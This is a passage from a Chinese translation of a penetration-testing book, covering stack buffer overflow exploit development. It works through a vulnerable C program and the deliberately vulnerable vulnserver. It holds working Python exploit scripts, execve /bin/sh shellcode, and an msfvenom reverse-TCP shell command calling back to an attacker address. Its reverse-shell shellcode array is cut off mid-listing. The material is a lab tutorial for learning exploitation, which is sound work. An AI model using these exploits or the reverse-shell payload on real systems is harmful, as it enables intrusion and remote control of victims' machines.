# 渗透测试 Shellcode（三）

> 原文：[`annas-archive.org/md5/490B2CAE1041BE44E9F980C77B842689`](https://annas-archive.org/md5/490B2CAE1041BE44E9F980C77B842689)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第七章：利用开发-第 1 部分

利用开发，我们来了！现在我们开始真正的东西！在本章中，我们将学习如何处理利用模糊测试。我们还将学习利用开发中的技术，如控制指令指针以及如何找到放置我们的 shellcode 的位置。

以下是我们将在本章中涵盖的主题：

+   模糊测试和控制指令指针

+   注入 shellcode

+   缓冲区溢出的完整示例

让我们开始吧！

# 模糊测试和控制指令指针

在上一章中，我们注入了字符，但我们需要知道指令指针的确切偏移量，即注入 24 个 As。找到 RIP 寄存器的确切偏移量的想法是注入一个特定序列长度的模式，并根据堆栈上的最后一个元素计算 RIP 寄存器的偏移量。别担心，你将在下一个例子中理解。那么我们如何确定 RIP 寄存器的确切偏移量呢？我们有两个工具可以做到这一点，Metasploit 框架和 PEDA，我们将讨论它们两个。

# 使用 Metasploit 框架和 PEDA

首先，我们将使用 Metasploit 框架创建模式，为此我们需要导航到此位置：`/usr/share/metasploit-framework/tools/exploit/`。

现在，如何创建一个模式？我们可以使用`pattern_create.rb`来创建一个。

让我们举个例子，使用我们的易受攻击的代码，但使用一个更大的缓冲区，比如`256`：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int copytobuffer(char* input)
{
    char buffer[256];
    strcpy (buffer,input);
    return 0;
}

void main (int argc, char *argv[])
{
    int local_variable = 1;
    copytobuffer(argv[1]);
    exit(0);
}
```

现在，让我们编译它：

```
$ gcc -fno-stack-protector -z execstack buffer.c -o buffer
```

然后我们将使用 GDB：

```
$ gdb ./buffer
```

接下来，我们计算 RIP 位置的偏移量。因此，首先让我们在攻击机上使用 Metasploit 框架创建一个模式，并在`/usr/share/metasploit-framework/tools/exploit/`中进行操作：

```
$ ./pattern_create.rb -l 300 > pattern
```

在上一个命令中，我们生成了一个长度为`300`的模式，并将其保存在名为`pattern`的文件中。现在将此文件复制到我们的受害机器上，并在 GDB 中使用此模式作为输入：

```
$ run $(cat pattern)
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00285.jpeg)

代码停止了，如预期的那样，出现了错误。现在，我们需要提取堆栈中的最后一个元素，因为在那之后的元素应该溢出 RIP 寄存器。让我们看看如何使用`x`命令打印内存中的内容来获取堆栈中的最后一个元素。让我们看看`x`命令在 GDB 中的工作原理，使用`help x`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00286.jpeg)

现在，让我们使用`x`打印堆栈中的最后一个元素：

```
$ x/x $rsp
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00287.jpeg)

堆栈中的最后一个元素是`0x41386941`。您还可以使用`x/wx $rsp`来打印 RSP 寄存器内的完整字。现在我们需要在攻击机上使用`pattern_offset.rb`计算 RIP 寄存器的确切位置：

```
$ ./pattern_offset.rb -q 0x41386941 -l 300
```

首先，我们指定了我们从堆栈中提取的查询；然后我们指定了我们使用的模式的长度：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00288.jpeg)

它告诉我们堆栈中的最后一个元素位于位置`264`，这意味着接下来的六个字符应该溢出 RIP 寄存器：

```
#!/usr/bin/python
from struct import *

buffer = ''
buffer += 'A'*264
buffer += pack("<Q", 0x424242424242)
f = open("input.txt", "w")
f.write(buffer)
```

如果我们的计算是正确的，我们应该在 RIP 中看到 42。让我们运行这段代码：

```
$ chmod +x exploit.py
$ ./exploit.py
```

然后，在 GDB 中运行以下命令：

```
$ run $(cat input.txt)
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00289.jpeg)

我们的 42 现在在指令指针中，ASCII 中是`bbbbbb`。

# 注入 shellcode

RIP 现在包含我们的 6 个 Bs（`424242424242`），代码已经不再抱怨`0x0000424242424242`在内存中的位置了。

到目前为止，我们已经成功地利用了我们的漏洞。这就是我们的有效载荷：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00290.gif)

我们需要找到一种方法来注入 shellcode 到 As 中，这样我们就可以轻松地跳转到它。为此，我们需要首先注入`0x90`或 NOP 指令，即 NOP，只是为了确保我们的 shellcode 被正确注入。在注入我们的 shellcode 之后，我们将改变指令指针（RIP）到内存中包含 NOP 指令（`0x90`）的任何地址。

然后执行应该只是在所有 **NOP** 指令上传递，直到它碰到 **Shellcode**，然后开始执行它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00291.gif)

这就是我们的攻击应该是什么样子的。让我们尝试注入 `execve /bin/sh` shellcode（长度为 `32`）。现在我们需要在内存中找到包含 `0x90` 的任何地址：

```
#!/usr/bin/python
from struct import *

buffer = ''
buffer += '\x90'*232
buffer += 'C'*32
buffer += pack("<Q", 0x424242424242)
f = open("input.txt", "w")
f.write(buffer)
```

让我们运行新的攻击：

```
$./exploit.py
```

然后，在 GDB 中，运行以下命令：

```
$ run $(cat input.txt)
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00292.jpeg)

程序停止了。现在，让我们查看堆栈以搜索我们的 NOP 滑块，通过从内存中打印 `200` 个十六进制值：

```
$ x/200x $rsp
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00293.jpeg)

我们得到了它们！这些是我们注入的 NOP 指令。此外，在 NOP 之后，你可以看到 32 个 C（`43`），所以现在我们可以选择这些 NOP 指令中间的任何地址；让我们选择 `0x7fffffffe2c0`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00294.gif)

这就是最终的有效载荷应该是什么样子的：

```
#!/usr/bin/python
from struct import *

buffer = ''
buffer += '\x90'*232
buffer += '\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05'
buffer += pack("<Q", 0x7fffffffe2c0)
f = open("input.txt", "w")
f.write(buffer)
```

让我们运行攻击：

```
$ ./exploit.py
```

然后，在 GDB 中，运行以下命令：

```
$ run $(cat input.txt)
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00295.jpeg)

现在我们在 GDB 中得到了 bash 提示符；让我们尝试执行类似 `cat /etc/issue` 的命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00296.jpeg)

它给了我们 `/etc/issue` 的内容。

它成功了！

# 缓冲区溢出的完整示例

现在，让我们看一个完整的缓冲区溢出示例。我们需要下载并在 Windows 上运行 vulnserver。Vulnserver 是一个易受攻击的服务器，我们可以在其中练习利用开发技能。你可以在 [`github.com/stephenbradshaw/vulnserver`](https://github.com/stephenbradshaw/vulnserver) 找到它。

下载后，使用 `vulnserver.exe` 运行它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00297.gif)

现在，它正在工作，并等待在端口 `9999` 上使用 netcat 进行连接。

Netcat 是一个用于与服务器建立连接或监听端口并等待来自另一个客户端的连接的工具。现在，让我们从攻击机器上使用 `nc`：

```
$ nc 172.16.89.131 9999
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00298.jpeg)

现在，让我们尝试模糊化一个参数，比如 `TRUN`（这是一个易受攻击的参数，在易受攻击的设计应用程序中）。我们需要建立一个脚本来帮助我们做到这一点：

```
#!/usr/bin/python
import socket

server = '172.16.89.131'    # IP address of the victim machine 
sport = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
s.send(('TRUN .' + 'A'*50 + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
```

让我们尝试发送 `50` 个 A：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00299.jpeg)

它没有崩溃。那么 `5000` 个 A 呢：

```
#!/usr/bin/python
import socket

server = '172.16.89.131'
sport = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
s.send(('TRUN .' + 'A'*5000 + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
```

`./fuzzing.py` 命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00300.jpeg)

没有回复！让我们看看我们的 Windows 机器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00301.jpeg)

程序崩溃了，它抱怨内存位置 `0x41414141`，这是我们的 `5000` 个 A。在第二阶段，也就是控制 RIP，让我们创建一个长度为 `5000` 字节的模式。

从我们的攻击机器，导航到 `/usr/share/metasploit-framework/tools/exploit/`：

```
./pattern_create.rb -l 5000
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00302.jpeg)

将输出模式复制到我们的攻击中：

```
#!/usr/bin/python
import socket
server = '172.16.89.131'
sport = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

buffer="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

s.send(('TRUN .' + buffer + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
```

现在，让我们运行 vulnserver。然后，以管理员身份打开 Immunity Debugger。导航到 文件 | 附加 并选择 vulnserver：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00303.jpeg)

点击附加并运行程序。然后运行我们的攻击，并查看 Immunity Debugger 中发生了什么：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00304.gif)

让我们查看寄存器内部：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00305.jpeg)

现在，EIP 包含 `396F4338`。让我们尝试从我们的攻击机器中找到这个模式：

```
./pattern_offset.rb -q 0x396f4338 -l 5000
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00306.jpeg)

因此，为了控制指令指针，我们需要注入 `2006` 个 A。然后，我们需要 4 个字节来控制 EIP 寄存器，其余的将被注入为 shellcode（`5000-2006-4`）；这给我们 `2990` 个字符。让我们尝试一下，以确保我们走在正确的方向上：

```
#!/usr/bin/python
import socket

server = '172.16.89.131'
sport = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
buffer =''
buffer+= 'A'*2006
buffer+= 'B'*4
buffer+= 'C'*(5000-2006-4)
s.send(('TRUN .' + buffer + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n') 
print s.recv(1024)
s.close()
```

这就是我们的有效载荷应该是什么样子的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00307.gif)

关闭 Immunity Debugger，然后重新启动应用程序。然后，再次启动利用代码。我们应该看到 Bs 被注入到 EIP 寄存器中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00308.jpeg)

成功了！我要再次使用 Immunity Debugger 进行重新检查。让我们来看看寄存器（FPU）里面的情况：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00309.jpeg)

现在我们控制了 EIP 寄存器。让我们来看看堆栈里面的情况：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00310.jpeg)

正如你所看到的，这里有我们的 As，然后是 4 个字节的 Bs，溢出了 EIP 寄存器，然后是`299*0`个 Cs。

在下一章中，我们将在这些 Cs 中注入一个 shellcode。

# 总结

在本章中，我们经历了 fuzzing 以及如何使程序崩溃。然后，我们看到了如何使用 Metasploit Framework 获得 RIP 寄存器的确切偏移量，以及一种非常简单的注入 shellcode 的方法。最后，我们经历了一个完整的 fuzzing 示例，并控制了指令指针。

在下一章中，我们将继续我们的示例，看看如何找到一个地方放置 shellcode 并使其工作。此外，我们还将学习更多的缓冲区溢出技术。


# 第八章：Exploit 开发-第 2 部分

在本章中，我们将继续讨论 exploit 开发的话题。首先，我们将通过注入 shellcode 继续并完成我们之前的例子。然后，我们将讨论一种新的技术，用于避免 NX 保护机制（NX 将在最后一章中解释）。

以下是本章我们将涵盖的主题：

+   注入 shellcode

+   返回导向编程

+   结构化异常处理程序

# 注入 shellcode

现在，让我们继续上一章的例子。在我们控制了指令指针之后，我们需要做的是注入 shellcode 并将指令指针重定向到它。

为了实现这一点，我们需要为 shellcode 找一个家。实际上很容易；它只涉及跳转到堆栈。现在我们需要做的是找到那个指令：

1.  启动 vulnserver，然后以管理员身份启动 Immunity Debugger，并从“文件”菜单中，附加到 vulnserver：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00311.jpeg)

1.  点击运行程序图标，然后右键单击并选择搜索；然后，在所有模块中选择所有命令来搜索应用程序本身或任何相关库中的任何指令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00312.jpeg)

1.  然后我们需要做的是跳转到堆栈来执行我们的 shellcode；所以，让我们搜索`JMP ESP`指令并点击查找：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00313.jpeg)

1.  让我们从`kernel32.dll 7DD93132`复制`JMP ESP`的地址，然后再次在 Immunity Debugger 中重新运行 vulnserver，并点击运行程序图标。

你可以使用任何库，不仅仅是`kernel32.dll`。但是，如果你使用系统的库，比如`kernel32.dll`，那么由于 ASLR 机制（将在最后一章中解释），每次 Windows 启动时地址都会改变；但如果你使用与应用程序相关而与系统无关的库，那么地址就不会改变。

1.  然后，从攻击机器上，编辑我们的 exploit 如下：

```
#!/usr/bin/python
import socket

server = '172.16.89.131'
sport = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
buffer =''
buffer+= 'A'*2006
buffer += '\x32\x31\xd9\x7d'
buffer+= 'C'*(5000-2006-4)
s.send(('TRUN .' + buffer + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n') 
print s.recv(1024)
s.close()
```

1.  然后，运行 exploit。指令指针现在指向`43434343`，这是我们的`C`字符：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00314.jpeg)

1.  现在我们准备插入我们的 shellcode。让我们使用 Metasploit Framework 创建一个：

```
$ msfvenom -a x86 -platform Windows -p windows/shell_reverse_tcp LHOST=172.16.89.1 LPORT=4321 -b '\x00' -f python
```

1.  这个命令生成一个反向 TCP shell，连接回我的攻击机器的端口`4321`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00315.jpeg)

1.  因此，我们的最终 exploit 应该是这样的：

```
#!/usr/bin/python
import socket
server = '172.16.89.131'
sport = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

junk = 'A'*2006             \\ Junk value to overflow the stack

eip = '\x32\x31\xd9\x7d'    \\ jmp esp

nops = '\x90'*64    \\ To make sure that jump will be inside our shellcode

shellcode = ""
shellcode += "\xbb\x6e\x66\xf1\x4c\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b"
shellcode += "\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03\x34\x68\x13"
shellcode += "\xb9\x34\x9c\x51\x42\xc4\x5d\x36\xca\x21\x6c\x76\xa8"
shellcode += "\x22\xdf\x46\xba\x66\xec\x2d\xee\x92\x67\x43\x27\x95"
shellcode += "\xc0\xee\x11\x98\xd1\x43\x61\xbb\x51\x9e\xb6\x1b\x6b"
shellcode += "\x51\xcb\x5a\xac\x8c\x26\x0e\x65\xda\x95\xbe\x02\x96"
shellcode += "\x25\x35\x58\x36\x2e\xaa\x29\x39\x1f\x7d\x21\x60\xbf"
shellcode += "\x7c\xe6\x18\xf6\x66\xeb\x25\x40\x1d\xdf\xd2\x53\xf7"
shellcode += "\x11\x1a\xff\x36\x9e\xe9\x01\x7f\x19\x12\x74\x89\x59"
shellcode += "\xaf\x8f\x4e\x23\x6b\x05\x54\x83\xf8\xbd\xb0\x35\x2c"
shellcode += "\x5b\x33\x39\x99\x2f\x1b\x5e\x1c\xe3\x10\x5a\x95\x02"
shellcode += "\xf6\xea\xed\x20\xd2\xb7\xb6\x49\x43\x12\x18\x75\x93"
